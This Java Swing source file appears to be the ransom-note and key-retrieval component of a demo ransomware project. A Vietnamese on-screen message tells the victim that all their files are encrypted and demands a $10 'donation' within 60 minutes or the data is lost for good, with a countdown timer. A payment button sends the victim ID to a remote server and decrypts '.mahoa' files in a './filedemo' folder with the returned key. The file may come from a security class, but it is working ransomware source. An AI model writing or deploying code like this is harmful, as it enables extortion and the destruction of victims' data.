/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package gui;

import Utils.FileEncryptor;
import Utils.FileUtils;
import java.awt.Color;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import javax.swing.JLabel;
import javax.swing.JOptionPane;

/**
 *
 * @author mthuan
 */
public class Notification extends javax.swing.JFrame {
    private String id;
    //private final String BASE_URL = "http://localhost:3001";
     private final String BASE_URL = "https://anninhmang.onrender.com";

    /**
     * Creates new form Notification
     */
    public Notification(String i) {
        this.id = i;
        initComponents();
        this.setLocationRelativeTo(null);
        this.warnning.setText("<html><p style=\"font-weight: 600;font-size: 16px;color: red;\"><u style=\"font-weight: 900; font-size: 20px;\">XIN LƯU Ý</u> ĐÂY KHÔNG PHẢI LỜI ĐE DOẠ. TẤT CẢ DỮ LIỆU TRÊN MÁY BẠN ĐÃ BỊ CHÚNG TÔI MÃ HOÁ THÀNH ĐỊNH DẠNG KHÔNG THỂ ĐỌC ĐƯỢC (Bạn có thể tự mở file bất kỳ để kiểm tra) </p><p style=\"font-weight: 600;font-size: 16px;color: red;\">Để khôi phục tất cả file về như cũ bạn phải tham gia vào chương trình gây quỹ ủng hộ của chúng tôi bằng cách nhấn vào nút 'Thanh toán' để tham gia chương trình. Chi phí cho mỗi lần ủng hộ là 10$. Nếu bạn cố ý tắt chương trình này đi hoặc sau 60 phút mà bạn chưa thanh toán thì mọi dữ liệu của bạn sẽ bị mất <b style=\"font-weight: 900; font-size: 20px;\">VĨNH VIỄN</b></p></html>");
        this.timer.setText("<html>" +"<div style=\"color: red;font-weight: 800; font-family: 'Times New Roman', Times, serif;font-size:12px;\">Dữ liệu của bạn đã bị chúng tôi mã hoá thành dạng không thể sử dụng được để mở hoá dữ liệu bạn cần thực hiện các bước sau đây trong thời gian 30 phút\n" +
"    <ol>\n" +
"        <li>Vui lòng chọn thanh toán để nhận key</li>\n" +
"        <li>Nhập key vào phần mềm vào mọi dữ liệu của bạn sẽ quay về ban đầu</li>\n" +
"    </ol>\n" +
"</div>" +"</html>");
        
        timerCountDown();
    }
    
    public void timerCountDown(){
        new Thread(new CountDown(timer)).start();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        timer = new javax.swing.JLabel();
        warnning = new javax.swing.JLabel();
        jLabel1 = new javax.swing.JLabel();
        jPanel1 = new javax.swing.JPanel();
        donateBtn = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setUndecorated(true);
        setResizable(false);
        getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        timer.setFont(new java.awt.Font("Lucida Grande", 1, 36)); // NOI18N
        timer.setForeground(new java.awt.Color(255, 0, 51));
        timer.setText("59:99");
        getContentPane().add(timer, new org.netbeans.lib.awtextra.AbsoluteConstraints(50, 370, -1, -1));

        warnning.setFont(new java.awt.Font("Lucida Grande", 1, 24)); // NOI18N
        warnning.setForeground(new java.awt.Color(255, 0, 0));
        warnning.setText("This is warning message");
        getContentPane().add(warnning, new org.netbeans.lib.awtextra.AbsoluteConstraints(60, 0, 730, 300));

        jLabel1.setFont(new java.awt.Font("Lucida Grande", 1, 24)); // NOI18N
        jLabel1.setText("Thời gian còn lại:");
        getContentPane().add(jLabel1, new org.netbeans.lib.awtextra.AbsoluteConstraints(50, 320, 270, -1));

        jPanel1.setBackground(new java.awt.Color(255, 255, 255));

        donateBtn.setFont(new java.awt.Font("Lucida Grande", 1, 24)); // NOI18N
        donateBtn.setForeground(new java.awt.Color(0, 51, 255));
        donateBtn.setText("ỦNG HỘ QUỸ");
        donateBtn.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                donateClick(evt);
            }
        });

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addGap(369, 369, 369)
                .addComponent(donateBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 272, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(229, Short.MAX_VALUE))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()
                .addContainerGap(319, Short.MAX_VALUE)
                .addComponent(donateBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 89, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(62, 62, 62))
        );

        getContentPane().add(jPanel1, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 0, 870, 470));

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void donateClick(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_donateClick
        validDecrypt(this.id); 
    }//GEN-LAST:event_donateClick

    private void validDecrypt(String id) {
        try {
            // Define the API endpoint URL
            URL url = new URL(BASE_URL+"/valid");

            // Create an HTTP connection to the API endpoint
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");

            // Set the request headers (if any)
            connection.setRequestProperty("Content-Type", "application/json");

            // Set the request body
            String requestBody = "{\"id\":\"" + id + "\"}";

            byte[] requestBodyBytes = requestBody.getBytes("UTF-8");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Length", String.valueOf(requestBodyBytes.length));
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(requestBodyBytes);
            outputStream.flush();
            outputStream.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            if (connection.getResponseCode() == 200) {
                String key = br.readLine();
                JOptionPane.showMessageDialog(null, "Thanh toán thành công. Đang giải mã dữ liệu");

                //Thực hiện giải mã
                boolean isDecryptSuccess = this.decryptFile(key);

                if (isDecryptSuccess) {
                    JOptionPane.showMessageDialog(null, "Giải mã thành công");
                    System.exit(0);
                } else {
                    JOptionPane.showMessageDialog(null, "Giải mã bị lỗi");
                }

            } else {
                JOptionPane.showMessageDialog(null, br.readLine());

            }

        } catch (Exception ex) {
            ex.printStackTrace();
            JOptionPane.showMessageDialog(null, "Kết nối đến server thất bại vui lòng kiểm tra kết nối và thử lại");
        }

    }
    
    private boolean decryptFile(String key) {
        File dir = new File(new File("./filedemo").getAbsolutePath());
        List<String> fileList = FileUtils.readAllFileinFolder(new ArrayList<>(),dir);
        List<String> fillterFileList = FileUtils.fillterFile(fileList);
        fillterFileList.stream().forEach(path->{
            try {
                String outPath = path.substring(0, path.length() - ".mahoa".length());

                File inputFile = new File(path);
                File outputFile = new File(outPath);

                FileEncryptor.decrypt(inputFile, outputFile, key);
                FileUtils.delete(path);
            }catch (Exception ex){
                ex.printStackTrace();
            }
        });
        
        
        return true;
    }
    
    
    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Notification.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Notification.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Notification.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Notification.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Notification("").setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton donateBtn;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JLabel timer;
    private javax.swing.JLabel warnning;
    // End of variables declaration//GEN-END:variables

    class CountDown implements Runnable{
        private JLabel time;

        public CountDown(JLabel j) {
            this.time = j;
        }
        
        

        @Override
        public void run() {
            long countTime = 3600;
            while(countTime > 0){
                try{
                    
                    time.setForeground(Color.red);
                    String m=String.valueOf(countTime/60);
                    String s= String.valueOf(countTime - (countTime/60)*60);

                    m = m.length() < 2 ? "0"+m : m;
                    s = s.length() < 2 ? "0"+s : s;

                    String timeFormat = m + ":" + s;

                    time.setText(timeFormat);
                    Thread.sleep(1000);
                    
                    
                    if(countTime <= 300){
                        time.setForeground(Color.BLACK);
                        countTime--;
                        
                        m=String.valueOf(countTime/60);
                        s= String.valueOf(countTime - (countTime/60)*60);

                        m = m.length() < 2 ? "0"+m : m;
                        s = s.length() < 2 ? "0"+s : s;

                        timeFormat = m + ":" + s;

                        time.setText(timeFormat);
                        Thread.sleep(1000);
                        
                    }
                    
                    countTime--;
                }catch(Exception e){
                    
                }
            }
            
        }
        
    }

}
